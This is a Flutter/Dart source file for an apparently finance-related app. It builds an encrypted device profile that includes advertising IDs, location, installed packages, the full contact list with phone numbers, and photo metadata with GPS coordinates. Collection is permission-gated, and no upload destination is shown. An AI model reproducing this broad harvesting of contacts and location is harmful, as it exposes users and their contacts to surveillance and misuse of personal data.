// ignore: file_names
// import 'dart:convert';
import 'dart:io';
import 'package:battery_plus/battery_plus.dart';
// import 'package:clink/core/app_public_constants.dart';
// import 'package:clink/robov/utils/log_print/app_log.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:homewallet/core/app_public_constants.dart';
import 'package:intl/intl.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:screen_brightness/screen_brightness.dart';
import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:geolocator/geolocator.dart';
import 'package:uuid/uuid.dart';
import '../../models/device_collector_model.dart';
import '../network/encrypt/encrypt_tool.dart';
import '../network/requests/auth_repository.dart';

class DeviceInfoCollector {
  static const _deviceChannel = MethodChannel('flutter_native_channel');

  // 获取收集到的设备信息并加密
  static Future<(String, String)> getKeyAndDataWithDeviceInfo() async {
    final snapshot = await DeviceInfoCollector._collect();

    final dataJson = snapshot.toJson();
    final session = RequestEncryptTool();
    final locale = PlatformDispatcher.instance.locale;
    final currency = NumberFormat.simpleCurrency(
      locale: locale.toLanguageTag(),
    ).currencyName;

    dataJson["DeviceCurrencyCode"] = currency;
    dataJson["DeviceCPUType"] = 'ARM64';

    final devicePlacementState = await _getDevicePlacementState();
    dataJson["DevicePlacementState"] = devicePlacementState;

    final deviceInfo = DeviceInfoPlugin();
    final i = await deviceInfo.iosInfo;
    dataJson["IDFV"] = i.identifierForVendor ?? '';

    dataJson["DeviceProxy"] = await _isUsingProxy();
    dataJson["CarrierName"] = await _getCarrierName();
    dataJson["DeviceModel"] = await _getHwModel();
    dataJson["VPN"] = await _isUsingVPN();
    dataJson["DeviceToken"] = await _getNativeDeviceToken();
    dataJson["MainSimVoipSupported"] = await _getMainSimAvailable();
    dataJson["SubSimVoipSupported"] = await _getSubSimAvailable();
    dataJson["LastFactoryResetTime"] = 0;
    dataJson["DevicePrivateRelay"] = await AuthRepository().deviceDetect();

    dataJson["Contacts"] = await _getContactsInfo();
    dataJson["PhotoInfo"] = await _getPhotoInfo();
    dataJson["Package"] = await _getLiebiaoFromeNative();

    dataJson["PackageRisk"] = {"data": [], "switch": "off"};

    dataJson["CalendarInfo"] = {"data": [], "switch": "off"};

    // if (kDebugMode) {
    //   Clipboard.setData(ClipboardData(text: jsonEncode(dataJson)));
    // }

    // logLong('[getKeyAndDataWithDeviceInfo]dataJson: ${jsonEncode(dataJson)}');

    final resultData = session.encryptJson(dataJson);
    return (resultData["id"] ?? "", resultData["data"] ?? "");
  }

  static Future<DeviceInfoModel> _collect() async {
    final Map<String, dynamic> data = {};

    final deviceInfo = DeviceInfoPlugin();

    data["ActionMode"] = "ORDER";

    /// ===== 基础 =====
    data["CpuCount"] = Platform.numberOfProcessors.toString();
    data["DeviceTime"] = DateTime.now().millisecondsSinceEpoch;
    data["DataVersion"] = "260615";
    data["OSType"] = Platform.isIOS ? "IOS" : "Android";
    data["JailBreak"] = "false";

    data["SDKVersion"] = "1.2.2";

    /// ===== App =====
    data["BundleId"] = AppPublicConstants.appBundleId;

    /// ===== 电池 =====
    try {
      data["Battery"] = await Battery().batteryLevel;
    } catch (_) {
      data["Battery"] = 100;
    }

    /// ===== 设备 =====
    try {
      //   if (Platform.isAndroid) {
      //     final a = await deviceInfo.androidInfo;
      //     data["DeviceType"] = a.model;
      //     data["OSVersion"] = a.version.release;
      //     data["IsSimulator"] = (!a.isPhysicalDevice).toString();
      //     data["MachineName"] = a.device;
      //   } else {
      final i = await deviceInfo.iosInfo;
      data["DeviceType"] = i.utsname.machine;
      data["OSVersion"] = "iOS${i.systemVersion}";
      data["IsSimulator"] = (!i.isPhysicalDevice).toString();
      data["MachineName"] = i.name;
      // }
    } catch (_) {
      data["DeviceType"] = "";
      data["OSVersion"] = "";
      data["IsSimulator"] = "";
      data["MachineName"] = "";
    }

    /// ===== 屏幕 =====
    try {
      final window = PlatformDispatcher.instance.views.first;
      final size = window.physicalSize;
      data["ScreenWidth"] = size.width.toInt().toString();
      data["ScreenHeight"] = size.height.toInt().toString();
    } catch (_) {
      data["ScreenWidth"] = "0";
      data["ScreenHeight"] = "0";
    }

    /// ===== 地区 =====
    try {
      final locale = PlatformDispatcher.instance.locale;
      data["RegionLanguage"] = locale.toString();
      data["RegionCountry"] = locale.countryCode ?? " ";
      data["RegionTimezone"] = DateTime.now().timeZoneName;
    } catch (_) {
      data["RegionLanguage"] = " ";
      data["RegionCountry"] = " ";
      data["RegionTimezone"] = " ";
    }

    /// ===== 网络 =====
    data["NetworkType"] = await _getNetworkType();
    data["IDFA"] = await _getIDFA();

    final nativeMap = await _getIosDeviceInfoFromNative();
    data["Ip"] = nativeMap['Ip'] ?? "";
    data["ProcessUptime"] = nativeMap['ProcessUptime']?.toString() ?? '0';
    data["MemoryTotal"] = nativeMap['MemoryTotal']?.toString() ?? '0';
    data["MemoryFree"] = nativeMap['MemoryFree']?.toString() ?? '0';
    data["MemoryUsed"] = nativeMap['MemoryUsed']?.toString() ?? '0';
    data["DiskFree"] = nativeMap['DiskFree']?.toString() ?? '0';
    data["DiskTotal"] = nativeMap['DiskTotal']?.toString() ?? '0';
    data["MobDeviceId"] =
        nativeMap['MobDeviceId']?.toString() ??
        '00000000-0000-0000-0000-000000000000';

    final pos = await _getLocationFinal();
    data["Latitude"] = pos.$1;
    data["Longitude"] = pos.$2;

    data["ScreenBrightness"] = await _getBrightness();

    data["ICloudUbiquityToken"] = "";
    data["Wifi"] = "<unknown ssid>";

    /// ===== 业务字段 =====
    data["SDKSource"] = "objc-native-ios";
    data["RequestId"] = const Uuid().v4().toUpperCase();

    return DeviceInfoModel.fromJson(data);
  }

  /// 主卡是否可用
  static Future<bool> _getMainSimAvailable() async {
    try {
      final result = await _deviceChannel.invokeMethod<bool>(
        'getMainSimAvailable',
      );
      debugPrint("isMainSimAvailable: $result");

      return result ?? false;
    } catch (_) {
      return false;
    }
  }

  /// 副卡是否可用
  static Future<bool> _getSubSimAvailable() async {
    try {
      final result = await _deviceChannel.invokeMethod<bool>(
        'getSubSimAvailable',
      );
      debugPrint("isSubSimAvailable: $result");

      return result ?? false;
    } catch (_) {
      return false;
    }
  }

  /// 是否使用VPN
  static Future<bool> _isUsingVPN() async {
    try {
      final result = await _deviceChannel.invokeMethod<bool>('isUsingVPN');
      debugPrint("isUsingVPN: $result");

      return result ?? false;
    } catch (_) {
      return false;
    }
  }

  /// 获取硬件型号
  static Future<String> _getHwModel() async {
    try {
      final result = await _deviceChannel.invokeMethod<String>('getHwModel');
      debugPrint("hwModel: $result");

      return result ?? '';
    } catch (_) {
      return "";
    }
  }

  /// 获取本地设备令牌
  static Future<String> _getNativeDeviceToken() async {
    try {
      final deviceToken =
          await _deviceChannel.invokeMethod<String>('getNativeDeviceToken') ??
          '';
      debugPrint("deviceToken: $deviceToken");
      return deviceToken;
    } catch (_) {
      return "";
    }
  }

  /// 获取设备放置状态
  static Future<int> _getDevicePlacementState() async {
    try {
      final placementState =
          await _deviceChannel.invokeMethod<int>('getDevicePlacementState') ??
          1;
      debugPrint("placementState: $placementState");
      return placementState;
    } catch (_) {
      return 1;
    }
  }

  /// 获取运营商名称
  static Future<String> _getCarrierName() async {
    try {
      final carrierName =
          await _deviceChannel.invokeMethod<String>('getCarrierName') ?? '';
      debugPrint("carrierName: $carrierName");
      return carrierName;
    } catch (_) {
      return "";
    }
  }

  /// 获取网络类型
  static Future<String> _getNetworkType() async {
    try {
      final networkType =
          await _deviceChannel.invokeMethod<String>('getNetworkType') ?? '';
      debugPrint("networkType: $networkType");
      return networkType;
    } catch (_) {
      return "";
    }
  }

  /// 是否使用代理
  static Future<bool> _isUsingProxy() async {
    try {
      final isUsingProxy =
          await _deviceChannel.invokeMethod<bool>('isUsingProxy') ?? false;
      debugPrint("isUsingProxy: $isUsingProxy");
      return isUsingProxy;
    } catch (_) {
      return false;
    }
  }

  /// 获取IDFA
  static Future<String> _getIDFA() async {
    // 获取当前状态
    var status = await AppTrackingTransparency.trackingAuthorizationStatus;

    // 如果没授权，弹窗请求
    if (status == TrackingStatus.notDetermined) {
      status = await AppTrackingTransparency.requestTrackingAuthorization();
    }

    // 已授权才有IDFA
    if (status == TrackingStatus.authorized) {
      final idfa = await AppTrackingTransparency.getAdvertisingIdentifier();
      return idfa;
    } else {
      return "00000000-0000-0000-0000-000000000000";
    }
  }

  /// 获取屏幕亮度
  static Future<String> _getBrightness() async {
    try {
      final value = await ScreenBrightness.instance.application;

      return value.toString();
    } catch (_) {
      return "0";
    }
  }

  /// 获取位置信息
  static Future<(String, String)> _getLocationFinal() async {
    try {
      bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
      if (!serviceEnabled) return ("0.00000000", "0.00000000");

      LocationPermission permission = await Geolocator.checkPermission();

      if (permission == LocationPermission.denied) {
        permission = await Geolocator.requestPermission();

        if (permission == LocationPermission.denied) {
          return ("0.00000000", "0.00000000");
        }
      }

      if (permission == LocationPermission.deniedForever) {
        return ("0.00000000", "0.00000000");
      }

      final currentPosition = await Geolocator.getCurrentPosition(
        // ignore: deprecated_member_use
        desiredAccuracy: LocationAccuracy.medium,
      );
      return (
        currentPosition.latitude.toString(),
        currentPosition.longitude.toString(),
      );
    } catch (_) {
      return ("0.00000000", "0.00000000");
    }
  }

  /// 从原生获取iOS部分设备信息
  static Future<Map<String, dynamic>> _getIosDeviceInfoFromNative() async {
    try {
      final result = await _deviceChannel.invokeMethod<Map<dynamic, dynamic>>(
        'getDeviceInfo',
      );
      final map = Map<String, dynamic>.from(result ?? {});

      return {
        'MobDeviceId': map['mobDeviceId'] ?? '',
        'BundleId': map['bundleId'] ?? '',
        'OSVersion': map['osVersion'] ?? '',
        'IDFA': map['idfa'] ?? '',
        "DrmId": map['DrmId'],
        'Ip': map['ip'] ?? '',
        // NEW: Thêm RAM/Disk info từ native
        'MemoryTotal': map['MemoryTotal'],
        'MemoryFree': map['MemoryFree'],
        'MemoryUsed': map['MemoryUsed'],
        'DiskTotal': map['DiskTotal'],
        'DiskFree': map['DiskFree'],
        'ProcessUptime': map['ProcessUptime'], // NEW
      };
    } catch (_) {
      return {
        "Ip": "",
        "ProcessUptime": "",
        "MemoryTotal": "0",
        "MemoryFree": "0",
        "MemoryUsed": "0",
        "DiskFree": "0",
        "DiskTotal": "0",
        "MobDeviceId": '00000000-0000-0000-0000-000000000000',
      };
    }
  }

  /// 从原生获取iOS部分设备信息
  static Future<Map<String, dynamic>> _getLiebiaoFromeNative() async {
    try {
      final result = await _deviceChannel.invokeMethod<Map<dynamic, dynamic>>(
        'getLiebiao',
      );

      return Map<String, dynamic>.from(result ?? {});
    } catch (_) {
      return {'data': [], 'switch': 'off'};
    }
  }

  /// 获取联系人信息
  static Future<Map<String, dynamic>> _getContactsInfo() async {
    try {
      final status = await FlutterContacts.permissions.request(
        PermissionType.read,
      );
      if (status != PermissionStatus.granted &&
          status != PermissionStatus.limited) {
        return {'data': <dynamic>[], 'switch': 'off'};
      }

      // Lấy danh bạ có đầy đủ property (số điện thoại, tổ chức, ngày sinh...)
      final contacts = await FlutterContacts.getAll(
        properties: {
          ContactProperty.phone,
          ContactProperty.organization,
          ContactProperty.name,
        },
      );

      final List<Map<String, dynamic>> items = [];

      for (final c in contacts) {
        // Plugin flutter_contacts phiên bản hiện tại không có field birthday,
        // nên theo tài liệu, nếu lấy không được thì để giá trị mặc định là "".
        const String birthdayStr = '';

        final phone = c.phones.isNotEmpty ? c.phones.first.number : '';
        final org = c.organizations.isNotEmpty
            ? c.organizations.first.name
            : '';

        items.add({
          'birthday': birthdayStr,
          'id': c.id,
          'phone': phone,
          'organization': org,
          'name': c.displayName,
          'switch': 'on', // đã được cấp quyền
        });
      }

      return {'data': items, 'switch': 'on'};
    } catch (_) {
      return {'data': [], 'switch': 'off'};
    }
  }

  /// 获取照片信息
  static Future<Map<String, dynamic>> _getPhotoInfo() async {
    try {
      final result = await PhotoManager.requestPermissionExtend();
      if (!result.isAuth) {
        return {'data': [], 'switch': 'off'};
      }

      final List<AssetPathEntity> paths = await PhotoManager.getAssetPathList(
        type: RequestType.image,
      );

      final List<AssetEntity> allAssets = [];
      for (final p in paths) {
        final assets = await p.getAssetListPaged(page: 0, size: 200);
        allAssets.addAll(assets);
      }

      final List<Map<String, dynamic>> items = [];
      for (final asset in allAssets) {
        final lat = asset.latitude;
        final lon = asset.longitude;

        items.add({
          'Favorite': asset.isFavorite,
          'ImageName': asset.title ?? '',
          'CreationDate': asset.createDateTime.millisecondsSinceEpoch,
          'SourceType': 1,
          // photo_manager v3 不再暴露 isHide，这里统一用 false 作为默认值
          'Hidden': false,
          'MediaType': asset.type == AssetType.video ? 2 : 1,
          'ImageMD5': '',
          'Location': (lon != null && lat != null)
              ? '${lon}_$lat'
              : '0.000000_0.000000',
          'Resolution': '${asset.width}_${asset.height}',
        });
      }

      return {'data': items, 'switch': 'on'};
    } catch (_) {
      return {'data': [], 'switch': 'off'};
    }
  }
}
